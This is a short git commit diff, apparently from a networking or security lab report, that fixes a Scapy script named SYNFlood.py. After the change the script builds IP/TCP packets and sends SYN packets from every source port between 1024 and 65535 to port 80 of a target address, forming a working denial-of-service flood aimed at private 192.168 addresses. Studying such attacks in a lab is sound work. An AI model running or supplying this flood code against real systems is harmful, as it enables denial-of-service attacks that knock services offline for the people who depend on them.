4a13ea54047aeab425ae5ebfc83871d907b89570
Pietro Prandini <prandinip@gmail.com>
2018-12-30 21:10:31 +0100

    details

--- report/scapy/SYNFlood.py
+++ report/scapy/SYNFlood.py
@@ -5,7 +5,7 @@ def sendSynFlood(sourceIP,targetIP):
     for sourcePort in range(1024,65535):
         ip = IP(src=sourceIP,dst=targetIP)
         tcp = TCP(sport=sourcePort, dport=80)
-        packet = Layer3/Layer4
+        packet = ip/tcp
         send(packet)
 
 sendSynFlood("192.168.62.20","192.168.40.50")
